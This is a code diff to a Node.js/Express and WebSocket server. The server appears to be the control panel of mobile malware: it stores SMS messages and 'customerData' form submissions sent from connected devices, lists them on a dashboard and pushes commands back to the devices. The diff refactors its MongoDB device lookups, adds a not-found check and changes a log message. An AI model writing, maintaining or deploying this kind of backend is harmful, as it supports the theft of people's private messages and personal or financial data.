@@ -78,7 +78,8 @@ app.post('/api/delete-device', async (req, res) => {
   try {
     const { deviceId, password } = req.body || {};
     if (password !== adminPassword) return res.status(401).json({ success: false, message: 'Wrong password' });
-    await Device.deleteMany({ $or: [{ deviceId }, { _id: mongoose.Types.ObjectId.isValid(deviceId) ? deviceId : null }] });
+    const query = mongoose.Types.ObjectId.isValid(deviceId) ? { _id: deviceId } : { deviceId };
+    await Device.deleteMany(query);
     io.emit('dashboard-update');
     return res.json({ success: true });
   } catch (err) { return res.status(500).json({ success: false }); }
@@ -87,8 +88,9 @@ app.post('/api/delete-device', async (req, res) => {
 app.post('/api/delete-sms', async (req, res) => {
     try {
         const { deviceId, smsData } = req.body || {};
+        const query = mongoose.Types.ObjectId.isValid(deviceId) ? { _id: deviceId } : { deviceId };
         await Device.findOneAndUpdate(
-            { $or: [{ deviceId }, { _id: mongoose.Types.ObjectId.isValid(deviceId) ? deviceId : null }] },
+            query,
             { $pull: { smsMessages: { body: smsData.body, date: smsData.date } } }
         );
         return res.json({ success: true });
@@ -98,8 +100,9 @@ app.post('/api/delete-sms', async (req, res) => {
 app.post('/api/pin-device', async (req, res) => {
     try {
         const { deviceId, status } = req.body || {};
+        const query = mongoose.Types.ObjectId.isValid(deviceId) ? { _id: deviceId } : { deviceId };
         await Device.findOneAndUpdate(
-            { $or: [{ deviceId }, { _id: mongoose.Types.ObjectId.isValid(deviceId) ? deviceId : null }] },
+            query,
             { $set: { isPinned: !!status } }
         );
         io.emit('dashboard-update');
@@ -110,10 +113,12 @@ app.post('/api/pin-device', async (req, res) => {
 app.post('/api/command', async (req, res) => {
     try {
         const { deviceId, action, data } = req.body || {};
-        let device = await Device.findOne({ $or: [{ deviceId }, { _id: mongoose.Types.ObjectId.isValid(deviceId) ? deviceId : null }] }).lean();
-        const clients = global.deviceSockets.get(deviceId) || global.deviceSockets.get(device?.deviceId);
+        const query = mongoose.Types.ObjectId.isValid(deviceId) ? { _id: deviceId } : { deviceId };
+        let device = await Device.findOne(query).lean();
+        if (!device) return res.status(404).json({ success: false });
+        
+        const clients = global.deviceSockets.get(device.deviceId);
         if (action === 'VIEW_DATA' || action === 'VIEW_SMS' || action === 'VIEW_FORM') {
-            if (!device) return res.status(404).json({ success: false });
             return res.json({ success: true, device, messages: device.smsMessages, customerData: device.customerData });
         }
         if (!clients || clients.size === 0) return res.json({ success: false, message: 'Offline' });
@@ -137,6 +142,7 @@ wss.on('connection', (ws, req) => {
       ws.deviceId = id;
       if (!global.deviceSockets.has(id)) global.deviceSockets.set(id, new Set());
       global.deviceSockets.get(id).add(ws);
+      
       let b = parseInt(data.battery);
       const update = { 
           $set: { 
@@ -148,6 +154,7 @@ wss.on('connection', (ws, req) => {
       };
       if (data.type === 'SMS_LIST') update.$set.smsMessages = data.messages;
       if (data.type === 'FORM_SUBMIT') update.$set.customerData = data.customerData;
+      
       if (dbConnected) {
           await Device.findOneAndUpdate({ deviceId: id }, { ...update, $setOnInsert: { registrationTimestamp: new Date() } }, { upsert: true });
           io.emit('dashboard-update');
@@ -158,4 +165,4 @@ wss.on('connection', (ws, req) => {
 });
 
 const PORT = process.env.PORT || 3000;
-server.listen(PORT, '0.0.0.0', () => console.log('🚀 Port', PORT));
+server.listen(PORT, '0.0.0.0', () => console.log('🚀 Server started'));
